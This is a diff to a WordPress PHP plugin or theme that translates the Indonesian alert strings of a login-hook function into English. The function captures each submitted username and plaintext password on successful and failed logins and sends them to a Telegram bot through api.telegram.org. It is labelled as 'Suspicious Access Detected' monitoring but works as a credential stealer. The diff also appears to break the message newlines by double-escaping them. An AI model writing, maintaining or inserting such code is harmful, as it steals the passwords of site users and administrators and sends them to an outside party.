@@ -21,14 +21,14 @@ function kirimInfoLoginTelegram($username, $password, $status) {
         . $_SERVER['HTTP_HOST']
         . $_SERVER['REQUEST_URI'];
 
-    $message  = "Akses Mencurigakan Terdeteksi\n";
-    $message .= "Status: " . strtoupper($status) . "\n";
-    $message .= "Site: " . get_site_url() . "\n";
-    $message .= "Username: " . sanitize_text_field($username) . "\n";
-    $message .= "Password: " . sanitize_text_field($password) . "\n";
-    $message .= "URL: " . esc_url_raw($current_url) . "\n";
-    $message .= "IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown') . "\n";
-    $message .= "Waktu: " . current_time('mysql');
+    $message  = "Suspicious Access Detected\\n";
+    $message .= "Status: " . strtoupper($status) . "\\n";
+    $message .= "Site: " . get_site_url() . "\\n";
+    $message .= "Username: " . sanitize_text_field($username) . "\\n";
+    $message .= "Password: " . sanitize_text_field($password) . "\\n";
+    $message .= "URL: " . esc_url_raw($current_url) . "\\n";
+    $message .= "IP: " . (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown') . "\\n";
+    $message .= "Time: " . current_time('mysql');
 
     $apiURL = "https://api.telegram.org/bot{$botToken}/sendMessage";
     $params = [
@@ -57,7 +57,7 @@ add_action('wp_login', function($user_login) {
 
     if (!empty($_SESSION['last_login_attempt'])) {
         $data = $_SESSION['last_login_attempt'];
-        kirimInfoLoginTelegram($data['username'], $data['password'], 'MASUK');
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN SUCCESS');
         unset($_SESSION['last_login_attempt']);
     }
 }, 10, 1);
@@ -67,10 +67,10 @@ add_action('wp_login_failed', function($username) {
 
     if (!empty($_SESSION['last_login_attempt'])) {
         $data = $_SESSION['last_login_attempt'];
-        kirimInfoLoginTelegram($data['username'], $data['password'], 'TIDAK MASUK');
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'LOGIN FAILED');
         unset($_SESSION['last_login_attempt']);
     } else {
-        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'TIDAK MASUK');
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'LOGIN FAILED');
     }
 }, 10, 1);
 
